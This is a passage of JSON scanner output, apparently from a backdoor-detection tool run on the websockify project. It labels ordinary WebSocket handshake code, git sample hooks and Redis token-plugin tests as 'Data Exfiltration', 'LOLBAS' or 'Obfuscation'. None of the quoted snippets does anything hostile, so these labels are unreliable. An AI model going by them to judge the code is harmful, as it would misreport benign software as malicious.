                      "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/applypatch-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/plain_echo.html"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 103,
                  "endLine": 140,
                  "endColumn": 111,
                  "snippet": {
                    "text": "        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n        }\n    </script>\n",
                    "rendered": {
                      "text": "        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n        }\n    </script>\n",
                      "markdown": "`        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n        }\n    </script>\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 29,
                  "endLine": 241,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        headers from the HTTP request.\n\n        A server can identify that a client is requesting a WebSocket\n        connection by looking at the \"Upgrade\" header. It will include\n        the value \"websocket\" in such cases.\n\n        WebSocketWantWriteError can be raised if the response cannot be\n",
                    "rendered": {
                      "text": "        headers from the HTTP request.\n\n        A server can identify that a client is requesting a WebSocket\n        connection by looking at the \"Upgrade\" header. It will include\n        the value \"websocket\" in such cases.\n\n        WebSocketWantWriteError can be raised if the response cannot be\n",
                      "markdown": "`        headers from the HTTP request.\n\n        A server can identify that a client is requesting a WebSocket\n        connection by looking at the \"Upgrade\" header. It will include\n        the value \"websocket\" in such cases.\n\n        WebSocketWantWriteError can be raised if the response cannot be\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 717,
                  "startColumn": 9,
                  "endLine": 717,
                  "endColumn": 15,
                  "snippet": {
                    "text": "            raise WebSocketWantWriteError\n\n        # We had a pending close and we've flushed the buffer,\n        # time to end things\n        if self._received_close and self._sent_close:\n            self._close()\n\n",
                    "rendered": {
                      "text": "            raise WebSocketWantWriteError\n\n        # We had a pending close and we've flushed the buffer,\n        # time to end things\n        if self._received_close and self._sent_close:\n            self._close()\n\n",
                      "markdown": "`            raise WebSocketWantWriteError\n\n        # We had a pending close and we've flushed the buffer,\n        # time to end things\n        if self._received_close and self._sent_close:\n            self._close()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 4,
                  "endLine": 23,
                  "endColumn": 12,
                  "snippet": {
                    "text": "import socket\nimport ssl\nimport struct\nfrom base64 import b64encode\nfrom hashlib import sha1\nfrom urllib.parse import urlparse\n\n",
                    "rendered": {
                      "text": "import socket\nimport ssl\nimport struct\nfrom base64 import b64encode\nfrom hashlib import sha1\nfrom urllib.parse import urlparse\n\n",
                      "markdown": "`import socket\nimport ssl\nimport struct\nfrom base64 import b64encode\nfrom hashlib import sha1\nfrom urllib.parse import urlparse\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 5,
                  "endLine": 23,
                  "endColumn": 11,
                  "snippet": {
                    "text": "import socket\nimport ssl\nimport struct\nfrom base64 import b64encode\nfrom hashlib import sha1\nfrom urllib.parse import urlparse\n\n",
                    "rendered": {
                      "text": "import socket\nimport ssl\nimport struct\nfrom base64 import b64encode\nfrom hashlib import sha1\nfrom urllib.parse import urlparse\n\n",
                      "markdown": "`import socket\nimport ssl\nimport struct\nfrom base64 import b64encode\nfrom hashlib import sha1\nfrom urllib.parse import urlparse\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 280,
                  "startColumn": 31,
                  "endLine": 280,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            accept = b64encode(accept).decode(\"ascii\")\n\n            self.protocol = ''\n            protocols = headers.get('Sec-WebSocket-Protocol', '').split(',')\n            if protocols:\n                self.protocol = self.select_subprotocol(protocols)\n                # We are required to choose one of the protocols\n",
                    "rendered": {
                      "text": "            accept = b64encode(accept).decode(\"ascii\")\n\n            self.protocol = ''\n            protocols = headers.get('Sec-WebSocket-Protocol', '').split(',')\n            if protocols:\n                self.protocol = self.select_subprotocol(protocols)\n                # We are required to choose one of the protocols\n",
                      "markdown": "`            accept = b64encode(accept).decode(\"ascii\")\n\n            self.protocol = ''\n            protocols = headers.get('Sec-WebSocket-Protocol', '').split(',')\n            if protocols:\n                self.protocol = self.select_subprotocol(protocols)\n                # We are required to choose one of the protocols\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 271,
                  "startColumn": 25,
                  "endLine": 271,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            else:\n                raise Exception(\"Unsupported protocol version %s\" % ver)\n\n            key = headers.get('Sec-WebSocket-Key')\n            if key is None:\n                raise Exception(\"Missing Sec-WebSocket-Key header\");\n\n",
                    "rendered": {
                      "text": "            else:\n                raise Exception(\"Unsupported protocol version %s\" % ver)\n\n            key = headers.get('Sec-WebSocket-Key')\n            if key is None:\n                raise Exception(\"Missing Sec-WebSocket-Key header\");\n\n",
                      "markdown": "`            else:\n                raise Exception(\"Unsupported protocol version %s\" % ver)\n\n            key = headers.get('Sec-WebSocket-Key')\n            if key is None:\n                raise Exception(\"Missing Sec-WebSocket-Key header\");\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 259,
                  "startColumn": 25,
                  "endLine": 259,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            if headers.get(\"upgrade\", \"\").lower() != \"websocket\":\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n            ver = headers.get('Sec-WebSocket-Version')\n            if ver is None:\n                raise Exception(\"Missing Sec-WebSocket-Version header\");\n\n",
                    "rendered": {
                      "text": "            if headers.get(\"upgrade\", \"\").lower() != \"websocket\":\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n            ver = headers.get('Sec-WebSocket-Version')\n            if ver is None:\n                raise Exception(\"Missing Sec-WebSocket-Version header\");\n\n",
                      "markdown": "`            if headers.get(\"upgrade\", \"\").lower() != \"websocket\":\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n            ver = headers.get('Sec-WebSocket-Version')\n            if ver is None:\n                raise Exception(\"Missing Sec-WebSocket-Version header\");\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 256,
                  "startColumn": 22,
                  "endLine": 256,
                  "endColumn": 27,
                  "snippet": {
                    "text": "            self.client = False\n            self.socket = socket\n\n            if headers.get(\"upgrade\", \"\").lower() != \"websocket\":\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n            ver = headers.get('Sec-WebSocket-Version')\n",
                    "rendered": {
                      "text": "            self.client = False\n            self.socket = socket\n\n            if headers.get(\"upgrade\", \"\").lower() != \"websocket\":\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n            ver = headers.get('Sec-WebSocket-Version')\n",
                      "markdown": "`            self.client = False\n            self.socket = socket\n\n            if headers.get(\"upgrade\", \"\").lower() != \"websocket\":\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n            ver = headers.get('Sec-WebSocket-Version')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 219,
                  "startColumn": 35,
                  "endLine": 219,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            if accept != expected:\n                raise Exception(\"Invalid Sec-WebSocket-Accept header\");\n\n            self.protocol = headers.get('Sec-WebSocket-Protocol')\n            if len(protocols) == 0:\n                if self.protocol is not None:\n                    raise Exception(\"Unexpected Sec-WebSocket-Protocol header\")\n",
                    "rendered": {
                      "text": "            if accept != expected:\n                raise Exception(\"Invalid Sec-WebSocket-Accept header\");\n\n            self.protocol = headers.get('Sec-WebSocket-Protocol')\n            if len(protocols) == 0:\n                if self.protocol is not None:\n                    raise Exception(\"Unexpected Sec-WebSocket-Protocol header\")\n",
                      "markdown": "`            if accept != expected:\n                raise Exception(\"Invalid Sec-WebSocket-Accept header\");\n\n            self.protocol = headers.get('Sec-WebSocket-Protocol')\n            if len(protocols) == 0:\n                if self.protocol is not None:\n                    raise Exception(\"Unexpected Sec-WebSocket-Protocol header\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 207,
                  "startColumn": 28,
                  "endLine": 207,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                print(type(headers))\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n            accept = headers.get('Sec-WebSocket-Accept')\n            if accept is None:\n                raise Exception(\"Missing Sec-WebSocket-Accept header\");\n\n",
                    "rendered": {
                      "text": "                print(type(headers))\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n            accept = headers.get('Sec-WebSocket-Accept')\n            if accept is None:\n                raise Exception(\"Missing Sec-WebSocket-Accept header\");\n\n",
                      "markdown": "`                print(type(headers))\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n            accept = headers.get('Sec-WebSocket-Accept')\n            if accept is None:\n                raise Exception(\"Missing Sec-WebSocket-Accept header\");\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 203,
                  "startColumn": 22,
                  "endLine": 203,
                  "endColumn": 27,
                  "snippet": {
                    "text": "            headers = headers.decode('latin-1') + '\\r\\n'\n            headers = email.message_from_string(headers)\n\n            if headers.get(\"Upgrade\", \"\").lower() != \"websocket\":\n                print(type(headers))\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n",
                    "rendered": {
                      "text": "            headers = headers.decode('latin-1') + '\\r\\n'\n            headers = email.message_from_string(headers)\n\n            if headers.get(\"Upgrade\", \"\").lower() != \"websocket\":\n                print(type(headers))\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n",
                      "markdown": "`            headers = headers.decode('latin-1') + '\\r\\n'\n            headers = email.message_from_string(headers)\n\n            if headers.get(\"Upgrade\", \"\").lower() != \"websocket\":\n                print(type(headers))\n                raise Exception(\"Missing or incorrect upgrade header\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 41,
                  "endLine": 164,
                  "endColumn": 49,
                  "snippet": {
                    "text": "                path = \"/\"\n\n            self.send_request(\"GET\", path)\n            self.send_header(\"Host\", uri.hostname)\n            self.send_header(\"Upgrade\", \"websocket\")\n            self.send_header(\"Connection\", \"upgrade\")\n            self.send_header(\"Sec-WebSocket-Key\", self._key)\n",
                    "rendered": {
                      "text": "                path = \"/\"\n\n            self.send_request(\"GET\", path)\n            self.send_header(\"Host\", uri.hostname)\n            self.send_header(\"Upgrade\", \"websocket\")\n            self.send_header(\"Connection\", \"upgrade\")\n            self.send_header(\"Sec-WebSocket-Key\", self._key)\n",
                      "markdown": "`                path = \"/\"\n\n            self.send_request(\"GET\", path)\n            self.send_header(\"Host\", uri.hostname)\n            self.send_header(\"Upgrade\", \"websocket\")\n            self.send_header(\"Connection\", \"upgrade\")\n            self.send_header(\"Sec-WebSocket-Key\", self._key)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 70,
                  "endLine": 144,
                  "endColumn": 78,
                  "snippet": {
                    "text": "            if uri.scheme in (\"wss\", \"https\"):\n                context = ssl.create_default_context()\n                self.socket = context.wrap_socket(self.socket,\n                                                  server_hostname=uri.hostname)\n                self._state = \"ssl_handshake\"\n            else:\n                self._state = \"headers\"\n",
                    "rendered": {
                      "text": "            if uri.scheme in (\"wss\", \"https\"):\n                context = ssl.create_default_context()\n                self.socket = context.wrap_socket(self.socket,\n                                                  server_hostname=uri.hostname)\n                self._state = \"ssl_handshake\"\n            else:\n                self._state = \"headers\"\n",
                      "markdown": "`            if uri.scheme in (\"wss\", \"https\"):\n                context = ssl.create_default_context()\n                self.socket = context.wrap_socket(self.socket,\n                                                  server_hostname=uri.hostname)\n                self._state = \"ssl_handshake\"\n            else:\n                self._state = \"headers\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 57,
                  "endLine": 144,
                  "endColumn": 65,
                  "snippet": {
                    "text": "            if uri.scheme in (\"wss\", \"https\"):\n                context = ssl.create_default_context()\n                self.socket = context.wrap_socket(self.socket,\n                                                  server_hostname=uri.hostname)\n                self._state = \"ssl_handshake\"\n            else:\n                self._state = \"headers\"\n",
                    "rendered": {
                      "text": "            if uri.scheme in (\"wss\", \"https\"):\n                context = ssl.create_default_context()\n                self.socket = context.wrap_socket(self.socket,\n                                                  server_hostname=uri.hostname)\n                self._state = \"ssl_handshake\"\n            else:\n                self._state = \"headers\"\n",
                      "markdown": "`            if uri.scheme in (\"wss\", \"https\"):\n                context = ssl.create_default_context()\n                self.socket = context.wrap_socket(self.socket,\n                                                  server_hostname=uri.hostname)\n                self._state = \"ssl_handshake\"\n            else:\n                self._state = \"headers\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocket.py"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 56,
                  "endLine": 139,
                  "endColumn": 64,
                  "snippet": {
                    "text": "        # WantRead/WantWrite events\n\n        if self._state == \"new\":\n            self.socket = socket.create_connection((uri.hostname, port))\n\n            if uri.scheme in (\"wss\", \"https\"):\n                context = ssl.create_default_context()\n",
                    "rendered": {
                      "text": "        # WantRead/WantWrite events\n\n        if self._state == \"new\":\n            self.socket = socket.create_connection((uri.hostname, port))\n\n            if uri.scheme in (\"wss\", \"https\"):\n                context = ssl.create_default_context()\n",
                      "markdown": "`        # WantRead/WantWrite events\n\n        if self._state == \"new\":\n            self.socket = socket.create_connection((uri.hostname, port))\n\n            if uri.scheme in (\"wss\", \"https\"):\n                context = ssl.create_default_context()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 364,
                  "startColumn": 33,
                  "endLine": 364,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, None)\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, None)\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, None)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 356,
                  "startColumn": 33,
                  "endLine": 356,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_db_empty_pass(self):\n        plugin = TokenRedis('127.0.0.1::2:')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_db_empty_pass(self):\n        plugin = TokenRedis('127.0.0.1::2:')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_db_empty_pass(self):\n        plugin = TokenRedis('127.0.0.1::2:')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 348,
                  "startColumn": 33,
                  "endLine": 348,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_db_pass(self):\n        plugin = TokenRedis('127.0.0.1::2:verysecret')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_db_pass(self):\n        plugin = TokenRedis('127.0.0.1::2:verysecret')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_db_pass(self):\n        plugin = TokenRedis('127.0.0.1::2:verysecret')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 340,
                  "startColumn": 33,
                  "endLine": 340,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port_empty_db_pass(self):\n        plugin = TokenRedis('127.0.0.1:1234::verysecret')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port_empty_db_pass(self):\n        plugin = TokenRedis('127.0.0.1:1234::verysecret')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port_empty_db_pass(self):\n        plugin = TokenRedis('127.0.0.1:1234::verysecret')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 33,
                  "endLine": 332,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_empty_port_db_no_pass(self):\n        plugin = TokenRedis('127.0.0.1::2')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_empty_port_db_no_pass(self):\n        plugin = TokenRedis('127.0.0.1::2')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_empty_port_db_no_pass(self):\n        plugin = TokenRedis('127.0.0.1::2')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 324,
                  "startColumn": 33,
                  "endLine": 324,
                  "endColumn": 41,
                  "snippet": {
